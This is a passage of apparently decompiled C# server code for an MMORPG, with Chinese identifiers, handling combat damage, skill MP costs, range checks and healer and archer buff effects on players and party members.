						double num37 = (double)RNG.Next((int)num7 - 15, (int)num7 + 15) + (double)装备追加对怪攻击 + (double)药品追加对怪攻击;
						if (num37 <= 0.0)
						{
							num37 = 0.0;
						}
						else
						{
							if (base.Player_Job == 2)
							{
								if ((double)RNG.Next(1, 110) <= base.剑_冲冠一怒 && !怒)
								{
									显示大字(base.人物全服ID, 29);
									base.人物_SP += (int)((double)base.人物_SP * base.剑_冲冠一怒 * 0.005);
								}
								if ((double)RNG.Next(1, 100) <= base.剑_移花接木)
								{
									显示大字(base.人物全服ID, 26);
									加血((int)(num37 * 0.5));
								}
							}
							if (base.Player_Job == 9)
							{
								if ((double)RNG.Next(1, 110) <= base.谭_冲冠一怒 && !怒)
								{
									显示大字(base.人物全服ID, 29);
									base.人物_SP += (int)((double)base.人物_SP * base.谭_冲冠一怒 * 0.005);
								}
								if ((double)RNG.Next(1, 100) <= base.谭_移花接木)
								{
									显示大字(base.人物全服ID, 26);
									加血((int)(num37 * 0.5));
								}
							}
						}
						if (num37 <= 1.0)
						{
							num37 = RNG.Next(1, 5);
						}
						攻击计算完成(this, 人物ID, 武功ID, (int)num37, 0, npcTemp.Rxjh_HP, 0);
					}
				}
			}
			catch (Exception ex2)
			{
				Form1.WriteLine(1, "攻击计算 " + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + 人物ID + " | " + ex2.Message);
			}
		}

		public void 魔法攻击(int 武功ID, int 人物ID)
		{
			try
			{
				触发鸾凤和鸣 = false;
				Players value3;
				if (人物ID >= 10000)
				{
					try
					{
						NpcClass value;
						if (MapClass.GetnpcTemplate(base.人物坐标_地图).TryGetValue(人物ID, out value))
						{
							if (value.IsNpc == 1)
							{
								PkID = 0;
							}
							else if (base.人物坐标_地图 != value.Rxjh_Map)
							{
								PkID = 0;
							}
							else if (BitConverter.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
							{
								PkID = 0;
							}
							else if ((base.Player_Job == 4 || base.Player_Job == 11) && BitConverter.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0)
							{
								初始化已装备物品();
								PkID = 0;
							}
							else
							{
								if (base.人物坐标_地图 != 801)
								{
									goto IL_0108;
								}
								if (value.FLD_PID == 15121)
								{
									if (base.Player_Zx != 1)
									{
										goto IL_0108;
									}
									PkID = 0;
								}
								else
								{
									if (value.FLD_PID != 15122 || base.Player_Zx != 2)
									{
										goto IL_0108;
									}
									PkID = 0;
								}
							}
						}
						goto end_IL_0012;
						IL_0108:
						if (base.人物坐标_地图 != 42101 || World.攻城战进程 == 3)
						{
							goto IL_0168;
						}
						if (value.FLD_PID == 16430)
						{
							PkID = 0;
						}
						else if (value.FLD_PID == 16431)
						{
							PkID = 0;
						}
						else
						{
							if (value.FLD_PID != 16435)
							{
								goto IL_0168;
							}
							PkID = 0;
						}
						goto end_IL_0012;
						IL_043a:
						武功类 value2;
						int num;
						if (value2.FLD_INDEX == -1)
						{
							武功连击记数器 = 0;
							new 武功类();
							武功类 武功类_ = 新武功连击[0];
							攻击计算完成(this, 人物ID, 武功ID, 0, 0, value.Rxjh_HP, 0);
							new Thread(new ThreadWithState(this, 武功类_, value, 人物ID, num).ThreadProc).Start();
						}
						else if (武功连击记数器 > 0)
						{
							if (武功连击记数器 < 武功l.Count)
							{
								new Thread(new ThreadWithState(this, 武功l[武功连击记数器], value, 人物ID, num).ThreadProc).Start();
							}
							else
							{
								武功连击记数器 = 0;
							}
						}
						else
						{
							if (base.Player_Job == 10 && 武功ID == 3000401)
							{
								移动(value.Rxjh_X, value.Rxjh_Y, 15f, value.Rxjh_Map);
							}
							攻击计算(value2, value, 武功ID, 人物ID, num);
						}
						goto end_IL_0012;
						IL_0168:
						foreach (攻城数据 value68 in World.攻城数据list.Values)
						{
							if (value68.行会名字 == base.帮派名字)
							{
								if (value.FLD_PID == 16430)
								{
									PkID = 0;
									return;
								}
								if (value.FLD_PID == 16431)
								{
									PkID = 0;
									return;
								}
								if (value.FLD_PID == 16435)
								{
									PkID = 0;
									return;
								}
							}
						}
						if (World.天魔神宫大门是否死亡 == 0 && value.FLD_PID == 16435)
						{
							PkID = 0;
						}
						else if (value.Rxjh_HP <= 0)
						{
							value.NPC死亡 = false;
							value.更新死亡数据();
							PkID = 0;
						}
						else
						{
							num = 判断拳师连击(武功ID);
							if (num != 0)
							{
								武功ID = num;
							}
							if (!World.TBL_KONGFU.TryGetValue(武功ID, out value2))
							{
								PkID = 0;
							}
							else if (value2.FLD_PID == 400001 && !World.TBL_KONGFU.TryGetValue(base.当前激活技能ID, out value2))
							{
								PkID = 0;
							}
							else if (base.Player_Job != value2.FLD_JOB)
							{
								PkID = 0;
							}
							else if (value2.FLD_ZX != 0 && 师傅数据.STNAME == "" && base.Player_Zx != value2.FLD_ZX)
							{
								PkID = 0;
							}
							else
							{
								float num2 = value.Rxjh_X - base.人物坐标_X;
								float num3 = value.Rxjh_Y - base.人物坐标_Y;
								double num4 = Math.Sqrt((double)num2 * (double)num2 + (double)num3 * (double)num3);
								switch (base.Player_Job)
								{
								default:
									if (num4 > World.其他职业打怪距离)
									{
										PkID = 0;
										return;
									}
									break;
								case 11:
									if (num4 > 70.0 + base.梅_玄武的指点)
									{
										PkID = 0;
										return;
									}
									break;
								case 5:
									if (num4 > World.医生打怪距离)
									{
										PkID = 0;
										return;
									}
									break;
								case 4:
									if (num4 > World.弓箭手打怪距离 + base.弓_猎鹰之眼)
									{
										PkID = 0;
										return;
									}
									break;
								}
								int fLD_MP = value2.FLD_MP;
								if (value2.FLD_武功类型 == 2)
								{
									if (base.人物_MP >= base.夫妻武功攻击力MP)
									{
										魔法使用(base.夫妻武功攻击力MP);
										goto IL_043a;
									}
									魔法不足提示();
								}
								else if (value2.武功_等级 == 3)
								{
									int num5 = value2.FLD_MP + (value2.武功_等级 - 1) * value2.FLD_每级加MP;
									if (base.人物_MP >= num5)
									{
										魔法使用(num5);
										goto IL_043a;
									}
									魔法不足提示();
								}
								else
								{
									if (base.人物_MP >= value2.FLD_MP)
									{
										魔法使用(value2.FLD_MP);
										goto IL_043a;
									}
									魔法不足提示();
								}
							}
						}
						end_IL_0012:;
					}
					catch (Exception ex)
					{
						Form1.WriteLine(1, "魔法攻击2 " + base.人物全服ID + "|" + base.Client.ToString() + " | " + 武功ID + " | " + 人物ID + " | " + ex.Message);
					}
				}
				else if (World.allConnectedChars.TryGetValue(人物ID, out value3) && !value3.Player死亡 && value3.人物_HP > 0 && !value3.Client.挂机 && !base.Player死亡 && base.人物_HP > 0 && !base.Client.挂机 && 个人商店 == null && !打开仓库中 && value3.个人商店 == null)
				{
					if (Buffer.ToInt32(装备栏已穿装备[3].物品ID, 0) == 0)
					{
						发送激活技能数据(武功ID, 6);
					}
					else if ((base.Player_Job == 4 || base.Player_Job == 11) && Buffer.ToInt32(装备栏已穿装备[12].物品数量, 0) == 0)
					{
						发送激活技能数据(武功ID, 6);
						初始化已装备物品();
					}
					else if (base.人物坐标_地图 == value3.人物坐标_地图)
					{
						int num6 = 判断拳师连击(武功ID);
						if (num6 != 0)
						{
							武功ID = num6;
						}
						武功类 value4;
						if (World.TBL_KONGFU.TryGetValue(武功ID, out value4) && (value4.FLD_PID == 601201 || value4.FLD_PID == 601202 || (base.Player_Job == value4.FLD_JOB && base.Player_Job_leve >= value4.FLD_JOBLEVEL && base.Player_Level >= value4.FLD_LEVEL && (value4.FLD_ZX == 0 || base.Player_Zx == value4.FLD_ZX))) && ((value4.FLD_PID != 601201 && value4.FLD_PID != 601202 && value4.FLD_PID != 100301 && value4.FLD_PID != 200301 && value4.FLD_PID != 300301 && value4.FLD_PID != 400301 && value4.FLD_PID != 500301 && value4.FLD_PID != 800301) || base.FLD_情侣.Length != 0))
						{
							if (base.Player_Job == 10 && 武功ID == 3000401)
							{
								异常状态类 value5 = new 异常状态类(value3, 3000, 4, 0.0);
								value3.异常状态.Add(4, value5);
								移动(value3.人物坐标_X, value3.人物坐标_Y, 15f, value3.人物坐标_地图);
							}
							if (神女异常状态.ContainsKey(39))
							{
								if (超负荷等级 == 1)
								{
									base.人物_HP -= (int)((double)base.人物最大_HP * 0.05);
								}
								else if (超负荷等级 == 2)
								{
									base.人物_HP -= (int)((double)base.人物最大_HP * 0.1);
								}
								else if (超负荷等级 == 3)
								{
									base.人物_HP -= (int)((double)base.人物最大_HP * 0.15);
								}
							}
							if (神女异常状态.ContainsKey(36))
							{
								Random random = new Random();
								武功ID = 武功类List[random.Next(武功类List.Count)].FLD_PID;
							}
							if (value3.Player_Job == 13)
							{
								value3.万毒不侵 = false;
								if ((double)RNG.Next(1, 110) <= value3.神女万毒不侵)
								{
									value3.显示大字(value3.人物全服ID, 1023);
									value3.万毒不侵 = true;
								}
							}
							switch (武功ID)
							{
							case 501701:
							case 901501:
							case 6001201:
								break;
							case 501201:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									魔法使用(value4.FLD_MP);
									double num78 = 110.0 + base.医_妙手回春 + base.医_九天真气 * 1000.0;
									if ((double)RNG.Next(1, 100) <= base.医_升天二气功_万物回春)
									{
										num78 *= 2.0;
										显示大字(base.人物全服ID, 150);
									}
									value3.加血((int)num78);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									value3.更新HP_MP_SP();
									更新HP_MP_SP();
								}
								break;
							case 501202:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									魔法使用(value4.FLD_MP);
									double num11 = 140.0 + base.医_妙手回春 + base.医_九天真气 * 1000.0;
									if ((double)RNG.Next(1, 100) <= base.医_升天二气功_万物回春)
									{
										num11 *= 2.0;
										显示大字(base.人物全服ID, 150);
									}
									value3.加血((int)num11);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									value3.更新HP_MP_SP();
									更新HP_MP_SP();
								}
								break;
							case 501203:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									魔法使用(value4.FLD_MP);
									double num14 = 160.0 + base.医_妙手回春 + base.医_九天真气 * 1000.0;
									if ((double)RNG.Next(1, 100) <= base.医_升天二气功_万物回春)
									{
										num14 *= 2.0;
										显示大字(base.人物全服ID, 150);
									}
									if (组队id != 0)
									{
										组队Class value22;
										if (World.W组队.TryGetValue(组队id, out value22))
										{
											int 增加血量 = (int)num14;
											if (value3.人物全服ID == base.人物全服ID)
											{
												foreach (Players value69 in value22.队员列表.Values)
												{
													if (value69 != null && 查找范围玩家(1000, value69) && (double)new Random().Next(0, 101) < base.医_狂意护体)
													{
														if (!value69.追加状态列表.ContainsKey(700014))
														{
															value69.人物_SP += value69.人物_SP / 20;
															value69.更新HP_MP_SP();
														}
														if (!value69.追加状态列表.ContainsKey(700350))
														{
															value69.显示大字(value69.人物全服ID, 350);
															value69.状态效果(BitConverter.GetBytes(700350), 1, 363000);
															追加状态类 value23 = new 追加状态类(value69, 363000, 700350, 0);
															value69.追加状态列表.Add(700350, value23);
															value69.addFLD_追加百分比_防御(0.2);
															value3.更新武功和状态();
														}
													}
												}
												发送医生群疗数据(人物ID, value22, 增加血量, 武功ID, value4);
											}
											else
											{
												value3.加血((int)num14);
												value3.更新HP_MP_SP();
												发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
											}
										}
										else
										{
											value3.加血((int)num14);
											value3.更新HP_MP_SP();
											发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
										}
									}
									else
									{
										value3.加血((int)num14);
										if (value3.人物全服ID != base.人物全服ID)
										{
											value3.更新HP_MP_SP();
										}
										更新HP_MP_SP();
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									}
								}
								break;
							case 401301:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(401301))
									{
										value3.追加状态列表[401301].时间结束事件();
									}
									魔法使用(value4.FLD_MP);
									追加状态类 value49 = new 追加状态类(value3, 180000 + (int)base.弓_回流真气, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value49);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
									value3.FLD_人物_武功攻击力增加百分比 += 0.1;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 401302:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(401302))
									{
										value3.追加状态列表[401302].时间结束事件();
									}
									魔法使用(value4.FLD_MP);
									追加状态类 value13 = new 追加状态类(value3, 180000 + (int)base.弓_回流真气, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value13);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
									value3.FLD_人物_武功防御力增加百分比 += 0.1;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 401303:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(401303))
									{
										value3.追加状态列表[401303].时间结束事件();
									}
									魔法使用(value4.FLD_MP);
									追加状态类 value46 = new 追加状态类(value3, 180000 + (int)base.弓_回流真气, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value46);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
									switch (value3.Player_Job)
									{
									case 1:
										if (value3.真武绝击 > 0.0)
										{
											value3.真武绝击 += 10.0;
										}
										break;
									case 2:
										if (value3.剑_怒海狂澜 > 0.0)
										{
											value3.剑_怒海狂澜 += 10.0;
										}
										break;
									case 3:
										if (value3.枪_怒意之吼 > 0.0)
										{
											value3.枪_怒意之吼 += 10.0;
										}
										break;
									case 4:
										if (value3.弓_致命绝杀 > 0.0)
										{
											value3.弓_致命绝杀 += 10.0;
										}
										break;
									case 5:
										if (value3.真武绝击 > 0.0)
										{
											value3.真武绝击 += 10.0;
										}
										break;
									case 6:
										if (value3.刺_心神凝聚 > 0.0)
										{
											value3.刺_心神凝聚 += 10.0;
										}
										break;
									case 7:
										if (value3.琴师_升天二气功_三潭映月 > 0.0)
										{
											value3.琴师_升天二气功_三潭映月 += 10.0;
										}
										break;
									case 8:
										if (value3.真武绝击 > 0.0)
										{
											value3.真武绝击 += 10.0;
										}
										break;
									case 9:
										if (value3.谭_怒海狂澜 > 0.0)
										{
											value3.谭_怒海狂澜 += 10.0;
										}
										break;
									case 12:
										if (value3.真武绝击 > 0.0)
										{
											value3.真武绝击 += 10.0;
										}
										break;
									case 13:
										if (value3.神女真武绝击 > 0.0)
										{
											value3.神女真武绝击 += 10.0;
										}
										break;
									}
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 401201:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									魔法使用(value4.FLD_MP);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 401202:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(401202))
									{
										value3.追加状态列表[401202].时间结束事件();
									}
									魔法使用(value4.FLD_MP);
									追加状态类 value51 = new 追加状态类(value3, 18000 + (int)base.弓_回流真气, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value51);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
									value3.FLD_人物_追加_命中 += 40;
									value3.FLD_人物_追加_回避 -= 20;
									value3.更新武功和状态();
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 401203:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(401203))
									{
										value3.追加状态列表[401203].时间结束事件();
									}
									魔法使用(value4.FLD_MP);
									追加状态类 value60 = new 追加状态类(value3, 180000 + (int)base.弓_回流真气, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value60);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 180000 + (int)base.弓_回流真气);
									value3.FLD_人物_追加_命中 -= 20;
									value3.FLD_人物_追加_回避 += 40;
									value3.更新武功和状态();
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									更新HP_MP_SP();
								}
								break;
							case 501401:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.追加状态列表 != null)
									{
										if (value3.GetAddState(武功ID))
										{
											value3.追加状态列表[武功ID].时间结束事件();
										}
										if (value3.GetAddState(501602))
										{
											value3.追加状态列表[501602].时间结束事件();
										}
									}
									魔法使用(value4.FLD_MP);
									double num72 = 180000.0 + base.医_吸星大法;
									double num73 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num73 += base.医_九天真气;
									}
									追加状态类 value43 = new 追加状态类(value3, (int)num72, 武功ID, 0, num73);
									value3.追加状态列表.Add(武功ID, value43);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num72);
									value3.FLD_追加百分比_命中 += num73;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									升天四气功触发(null);
									更新HP_MP_SP();
									value3.更新武功和状态();
								}
								break;
							case 501402:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.追加状态列表 != null)
									{
										if (value3.GetAddState(武功ID))
										{
											value3.追加状态列表[武功ID].时间结束事件();
										}
										if (value3.GetAddState(501603))
										{
											value3.追加状态列表[501603].时间结束事件();
										}
									}
									魔法使用(value4.FLD_MP);
									double num15 = 180000.0 + base.医_吸星大法;
									double num16 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num16 += base.医_九天真气;
									}
									追加状态类 value24 = new 追加状态类(value3, (int)num15, 武功ID, 0, num16);
									value3.追加状态列表.Add(武功ID, value24);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num15);
									value3.FLD_人物_追加百分比_回避 += num16;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									升天四气功触发(null);
									更新HP_MP_SP();
									value3.更新武功和状态();
								}
								break;
							case 501403:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.追加状态列表 != null)
									{
										if (value3.GetAddState(武功ID))
										{
											value3.追加状态列表[武功ID].时间结束事件();
										}
										if (value3.GetAddState(501601))
										{
											value3.追加状态列表[501601].时间结束事件();
										}
									}
									魔法使用(value4.FLD_MP);
									double num76 = 180000.0 + base.医_吸星大法;
									double num77 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num77 += base.医_九天真气;
									}
									追加状态类 value48 = new 追加状态类(value3, (int)num76, 武功ID, 0, num77);
									value3.追加状态列表.Add(武功ID, value48);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num76);
									value3.FLD_追加百分比_HP上限 += num77;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									升天四气功触发(null);
									更新HP_MP_SP();
									value3.更新HP_MP_SP();
								}
								break;
							case 501301:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.追加状态列表 != null)
									{
										if (value3.GetAddState(501301))
										{
											value3.追加状态列表[501301].时间结束事件();
										}
										if (value3.GetAddState(501501))
										{
											value3.追加状态列表[501501].时间结束事件();
										}
									}
									魔法使用(value4.FLD_MP);
									double num85 = 180000.0 + base.医_吸星大法;
									double num86 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num86 += base.医_九天真气;
									}
									追加状态类 value64 = new 追加状态类(value3, (int)num85, 武功ID, 0, num86);
									value3.追加状态列表.Add(武功ID, value64);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num85);
									value3.addFLD_追加百分比_攻击(num86);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									升天四气功触发(null);
									更新HP_MP_SP();
									value3.更新武功和状态();
								}
								break;
							case 501302:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.追加状态列表 != null)
									{
										if (value3.GetAddState(501502))
										{
											value3.追加状态列表[501502].时间结束事件();
										}
										if (value3.GetAddState(501302))
										{
											value3.追加状态列表[501302].时间结束事件();
										}
										if (value3.GetAddState(501303))
										{
											value3.追加状态列表[501303].时间结束事件();
										}
									}
									魔法使用(value4.FLD_MP);
									double num17 = 180000.0 + base.医_吸星大法;
									double num18 = 0.05;
									if (base.医_九天真气 > 0.0)
									{
										num18 += base.医_九天真气;
									}
									追加状态类 value25 = new 追加状态类(value3, (int)num17, 武功ID, 0, num18);
									value3.追加状态列表.Add(武功ID, value25);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num17);
									value3.addFLD_追加百分比_防御(num18);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									升天四气功触发(null);
									更新HP_MP_SP();
									value3.更新武功和状态();
								}
								break;
							case 501303:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.追加状态列表 != null)
									{
										if (value3.GetAddState(501303))
										{
											value3.追加状态列表[501303].时间结束事件();
										}
										if (value3.GetAddState(501502))
										{
											value3.追加状态列表[501502].时间结束事件();
										}
										if (value3.GetAddState(501302))
										{
											value3.追加状态列表[501302].时间结束事件();
										}
									}
									魔法使用(value4.FLD_MP);
									double num74 = 180000.0 + base.医_吸星大法;
									double num75 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num75 += base.医_九天真气;
									}
									追加状态类 value47 = new 追加状态类(value3, (int)num74, 武功ID, 0, num75);
									value3.追加状态列表.Add(武功ID, value47);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num74);
									value3.addFLD_追加百分比_防御(num75);
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									升天四气功触发(null);
									更新HP_MP_SP();
									value3.更新武功和状态();
								}
								break;
							case 501502:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									double num81 = 600000.0 + base.医_吸星大法;
									double num82 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num82 += base.医_九天真气;
									}
									组队Class value56;
									if (World.W组队.TryGetValue(组队id, out value56) && 人物ID == base.人物全服ID)
									{
										foreach (Players value70 in value56.队员列表.Values)
										{
											if (查找范围玩家(400, value70))
											{
												if (value70.GetAddState(501502))
												{
													value70.追加状态列表[501502].时间结束事件();
												}
												if (value70.GetAddState(501302))
												{
													value70.追加状态列表[501302].时间结束事件();
												}
												if (value70.GetAddState(501303))
												{
													value70.追加状态列表[501303].时间结束事件();
												}
												追加状态类 value57 = new 追加状态类(value70, (int)num81, 武功ID, 0, num82);
												value70.追加状态列表.Add(武功ID, value57);
												value70.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num81);
												value70.addFLD_追加百分比_防御(num82);
												value70.更新武功和状态();
											}
										}
										发送医生群体辅助数据(人物ID, value56, 0, 武功ID, value4);
									}
									else
									{
										if (value3.追加状态列表 != null)
										{
											if (value3.GetAddState(武功ID))
											{
												value3.追加状态列表[武功ID].时间结束事件();
											}
											if (value3.GetAddState(501302))
											{
												value3.追加状态列表[501302].时间结束事件();
											}
											if (value3.GetAddState(501303))
											{
												value3.追加状态列表[501303].时间结束事件();
											}
										}
										追加状态类 value58 = new 追加状态类(value3, (int)num81, 武功ID, 0, num82);
										value3.追加状态列表.Add(武功ID, value58);
										value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num81);
										value3.addFLD_追加百分比_防御(num82);
										value3.更新武功和状态();
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									}
									魔法使用(value4.FLD_MP);
									升天四气功触发(null);
									更新HP_MP_SP();
								}
								break;
							case 501501:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									double num79 = 600000.0 + base.医_吸星大法;
									double num80 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num80 += base.医_九天真气;
									}
									组队Class value52;
									if (World.W组队.TryGetValue(组队id, out value52) && 人物ID == base.人物全服ID)
									{
										foreach (Players value71 in value52.队员列表.Values)
										{
											if (查找范围玩家(400, value71))
											{
												if (value71.GetAddState(501501))
												{
													value71.追加状态列表[501501].时间结束事件();
												}
												if (value71.GetAddState(501301))
												{
													value71.追加状态列表[501301].时间结束事件();
												}
												追加状态类 value53 = new 追加状态类(value71, (int)num79, 武功ID, 0, num80);
												value71.追加状态列表.Add(武功ID, value53);
												value71.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num79);
												value71.addFLD_追加百分比_攻击(num80);
												value71.更新武功和状态();
											}
										}
										发送医生群体辅助数据(人物ID, value52, 0, 武功ID, value4);
									}
									else
									{
										if (value3.追加状态列表 != null)
										{
											if (value3.GetAddState(武功ID))
											{
												value3.追加状态列表[武功ID].时间结束事件();
											}
											if (value3.GetAddState(501301))
											{
												value3.追加状态列表[501301].时间结束事件();
											}
										}
										追加状态类 value54 = new 追加状态类(value3, (int)num79, 武功ID, 0, num80);
										value3.追加状态列表.Add(武功ID, value54);
										value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num79);
										value3.addFLD_追加百分比_攻击(num80);
										value3.更新武功和状态();
										发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									}
									魔法使用(value4.FLD_MP);
									升天四气功触发(null);
									更新HP_MP_SP();
								}
								break;
							case 601201:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									if (value3.GetAddState(601201))
									{
										value3.追加状态列表[601201].时间结束事件();
									}
									追加状态类 value42 = new 追加状态类(value3, 1800000, 武功ID, 0);
									value3.追加状态列表.Add(武功ID, value42);
									value3.状态效果(BitConverter.GetBytes(武功ID), 1, 1800000);
									base.FLD_夫妻辅助_追加_防具_属性 = 1;
									发送攻击人物数据(this, 人物ID, 武功ID, 1, 0, value3.人物_HP, 0, -1);
									value3.计算人物装备数据();
									value3.更新武功和状态();
									魔法使用(value4.FLD_MP);
									更新HP_MP_SP();
								}
								break;
							case 501601:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									double num83 = 600000.0 + base.医_吸星大法;
									double num84 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num84 += base.医_九天真气;
									}
									组队Class value61;
									if (World.W组队.TryGetValue(组队id, out value61) && 人物ID == base.人物全服ID)
									{
										foreach (Players value72 in value61.队员列表.Values)
										{
											if (查找范围玩家(400, value72))
											{
												if (value72.GetAddState(武功ID))
												{
													value72.追加状态列表[武功ID].时间结束事件();
												}
												if (value72.GetAddState(501403))
												{
													value72.追加状态列表[501403].时间结束事件();
												}
												追加状态类 value62 = new 追加状态类(value72, (int)num83, 武功ID, 0, num84);
												value72.追加状态列表.Add(武功ID, value62);
												value72.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num83);
												value72.FLD_追加百分比_HP上限 += num84;
												value72.更新HP_MP_SP();
											}
										}
										发送医生群体辅助数据(人物ID, value61, 0, 501601, value4);
									}
									else
									{
										if (value3.追加状态列表 != null)
										{
											if (value3.GetAddState(武功ID))
											{
												value3.追加状态列表[武功ID].时间结束事件();
											}
											if (value3.GetAddState(501403))
											{
												value3.追加状态列表[501403].时间结束事件();
											}
										}
										追加状态类 value63 = new 追加状态类(value3, (int)num83, 武功ID, 0, num84);
										value3.追加状态列表.Add(武功ID, value63);
										value3.状态效果(BitConverter.GetBytes(武功ID), 1, (int)num83);
										value3.FLD_追加百分比_HP上限 += num84;
										value3.更新HP_MP_SP();
										发送攻击人物数据(this, 人物ID, 501601, 1, 0, value3.人物_HP, 0, -1);
									}
									魔法使用(value4.FLD_MP);
									升天四气功触发(null);
									更新HP_MP_SP();
								}
								break;
							case 501602:
								if (base.人物_MP < value4.FLD_MP)
								{
									魔法不足提示();
									发送激活技能数据(value4.FLD_PID, 2);
								}
								else
								{
									double num87 = 600000.0 + base.医_吸星大法;
									double num88 = 0.1;
									if (base.医_九天真气 > 0.0)
									{
										num88 += base.医_九天真气;
									}
									组队Class value65;
									if (World.W组队.TryGetValue(组队id, out value65) && 人物ID == base.人物全服ID)
									{
